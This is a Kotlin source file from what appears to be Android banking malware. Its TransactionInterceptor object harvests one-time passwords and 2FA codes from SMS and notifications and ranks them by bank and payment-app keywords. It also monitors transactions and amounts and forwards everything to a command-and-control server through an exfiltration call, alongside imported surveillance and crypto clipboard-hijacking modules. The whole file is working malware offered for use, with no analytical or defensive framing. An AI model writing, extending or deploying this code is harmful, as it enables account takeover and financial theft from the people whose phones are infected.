package com.xrc.app.finance

import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.surveillance.NotificationInterceptor
import com.xrc.app.surveillance.SMSReceiver
import com.xrc.app.wallet.CryptoClipboardHijack
import org.json.JSONObject

/**
 * Intercepts financial transactions by capturing OTP/2FA codes,
 * monitoring clipboard for crypto addresses, and forwarding
 * financial alerts to C2.
 */
object TransactionInterceptor {

    const val TAG = "TransactionInterceptor"
    private var otpCodes = mutableListOf<String>()

    // Improvement 1: OTP code matching with confidence scoring
    data class OTPResult(
        val code: String,
        val source: String,  // "sms" or "notification"
        val sender: String,
        val confidence: Float,
        val timestamp: Long = System.currentTimeMillis()
    )

    private val capturedOtps = mutableListOf<OTPResult>()

    fun captureOTP(code: String, source: String, sender: String) {
        val result = OTPResult(
            code = code,
            source = source,
            sender = sender,
            confidence = calculateConfidence(code, sender),
            timestamp = System.currentTimeMillis()
        )

        capturedOtps.add(result)

        // Notify C2 immediately
        val json = JSONObject().apply {
            put("type", "otp_captured")
            put("code", code)
            put("source", source)
            put("sender", sender)
            put("confidence", result.confidence)
            put("timestamp", result.timestamp)
        }

        XRCApp.instance.c2Client.send(json.toString())
        Log.i(TAG, "OTP captured: $code from $sender via $source (confidence: ${result.confidence})")

        // Auto-forward OTP to C2 user via Telegram or direct message
        XRCApp.instance.c2Client.sendExfiltrateData(
            "otp_code",
            json.toString()
        )
    }

    // Improvement 2: Confidence calculation to filter noise
    private fun calculateConfidence(code: String, sender: String): Float {
        var score = 0.5f

        // OTP is 4-8 digits
        if (code.matches(Regex("^\\d{4,8}$"))) score += 0.2f

        // Sender contains financial keywords
        val financialKeywords = listOf(
            "bank", "pay", "wallet", "crypto", "coin", "bitcoin",
            "trade", "stock", "finance", "card", "credit", "upi",
            "phonepe", "paytm", "gpay", "venmo", "cashapp", "transfer"
        )
        if (financialKeywords.any { sender.contains(it, ignoreCase = true) }) {
            score += 0.2f
        }

        // Sender is a known shortcode (4-6 digit number)
        if (sender.matches(Regex("^\\d{4,6}$"))) score += 0.1f

        return score.coerceIn(0f, 1f)
    }

    // Improvement 3: Transaction monitoring
    fun monitorTransaction(packageName: String, amount: String, destination: String) {
        val json = JSONObject().apply {
            put("type", "transaction_detected")
            put("package", packageName)
            put("amount", amount)
            put("destination", destination)
            put("timestamp", System.currentTimeMillis())
        }

        XRCApp.instance.c2Client.send(json.toString())
        Log.w(TAG, "Transaction detected: $amount to $destination via $packageName")
    }

    // Improvement 4: Check if any captured OTP matches a pending transaction
    fun matchOTPToPendingTransaction(transactionId: String, otpCode: String): Boolean {
        return capturedOtps.any {
            it.code == otpCode && System.currentTimeMillis() - it.timestamp < 60000
        }
    }

    fun getRecentOtps(limit: Int = 10): List<OTPResult> {
        return capturedOtps.takeLast(limit)
    }

    fun clearOtps() {
        capturedOtps.clear()
    }

    // Improvement 5: Financial SMS pattern detection
    fun analyzeSMSForFinance(sender: String, body: String): Boolean {
        val financialPatterns = listOf(
            Regex("""(?:credited|debited|sent|received|transferred|paid)\s*(?:Rs\.?|INR|₹|USD|\$|EUR|€|GBP|£)\s*[\d,.]+""", RegexOption.IGNORE_CASE),
            Regex("""(?:Your\s+)?(?:account|card|wallet|loan|emi)\s*(?:XXXX|ending|with)""", RegexOption.IGNORE_CASE),
            Regex("""(?:A/c|account|card)\s*(?:credit|debit)""", RegexOption.IGNORE_CASE),
            Regex("""(?:OTP|TOTP|2FA|verification code|one[- ]time password)""", RegexOption.IGNORE_CASE),
            Regex("""\b(?:bank|finance|wallet|crypto|bitcoin|blockchain|defi)\b""", RegexOption.IGNORE_CASE),
            Regex("""(?:payment|transaction|transfer|withdrawal|deposit)""", RegexOption.IGNORE_CASE)
        )

        val isFinancial = financialPatterns.any { it.containsMatchIn(body) }

        if (isFinancial) {
            // Extract OTP
            val otpPattern = Regex("""\b(\d{4,8})\b""")
            val match = otpPattern.find(body)
            if (match != null) {
                captureOTP(match.value, "sms_finance", sender)
            }

            // Extract amount
            val amountPattern = Regex("""(?:Rs\.?|INR|₹|USD|\$|EUR|€|GBP|£)\s*([\d,]+(?:\.\d{1,2})?)""", RegexOption.IGNORE_CASE)
            val amountMatch = amountPattern.find(body)
            if (amountMatch != null) {
                val amount = amountMatch.groupValues[1]
                CryptoClipboardHijack.logSuspiciousActivity("financial_sms", "$sender: $amount")
            }
        }

        return isFinancial
    }
}
